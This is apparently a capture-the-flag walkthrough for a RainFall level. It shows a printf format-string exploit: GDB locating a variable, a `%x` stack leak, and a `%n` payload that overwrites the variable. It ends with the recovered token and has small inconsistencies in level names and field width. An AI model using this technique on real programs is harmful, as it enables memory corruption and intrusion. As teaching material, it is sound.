# Walkthrough

**Main** : 
Exploiting a vulnerability in `printf` to change the value of a variable  `m` 
To tell `printf` to write the number of characters printed to a specified address, you can use the `%n` format specifier. However, to specify the address, you need to use the `%[number]$n` modifier. 
This modifier takes an argument specifying the position of the address on the stack. 
 The format string vulnerability allows  to modify the value at the specified address.

**Process**:  
> 1.  Found the address of the variable `m` using  debugging tools. 
> 2. Find  buffer  position on the stack.
>2.  Create the Payload, the payload will consist of multiple components:    
    -   Padding to reach the position on the stack where `%n` is expected.
    -   The format specifier `%[number]$n`, where `[number]` 
    -  Inject the Payload,  provide the payload as input to the program, which will then be used by `printf` to construct the output. 



##  The address of the variable `m` using GDB
```
level2@RainFall:~$ gdb ./level2 
...
(gdb) p &m
$1 = (<data variable, no debug info> *) 0x8049810
(gdb) 

````


##  Position of a buffer on the stack
We ging to use printf to fnd the position of buffe on the stack
By using the %x format string vulnerability to print memory address on the stack I give printf the follow string `aaaaaa %x ...` the %x it telling to printf to print memory content <br/>
Buffer content `aaaa` is at the 12th position `61616161`.


```
level4@RainFall:~$ python -c 'print "aaaa" + " %x" * 13' | ./level4 
aaaa b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 61616161 20782520
```



## Payload


The modifier %n will write the number of bytes specified in the choosen address.  
Creates a format string attack that aims to modify a variable using the %n  
The  `%12$n`  specifier tells printf to treat the argument at the 12th position as an address to write the number of characters printed


**2. load payload** 

The modifier `%d` can  specify the field width  that : `%16930116d`.
```
`python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4`

...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

```
